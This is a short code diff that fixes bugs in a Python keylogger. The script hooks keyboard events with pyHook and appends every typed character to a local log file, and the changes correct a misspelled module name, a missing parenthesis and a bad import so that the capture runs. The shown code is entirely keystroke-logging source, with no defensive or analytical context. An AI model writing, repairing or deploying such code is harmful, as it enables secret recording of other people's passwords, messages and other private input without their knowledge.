@@ -1,10 +1,9 @@
-import pyHook, pythoncom, sys, log, logging
+import pyHook, pythoncom, sys, logging
 
 file_log = 'C:\\important\\log.txt'
 
 def OnKeyboardEvent (event) :
-	logging.basicConfig(filename=file_log, level=loggine.DEBUG, format='%(message)s'
-	chr(event.Ascii)
+	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
 	logging.log(10,chr(event.Ascii))
 	return True
 
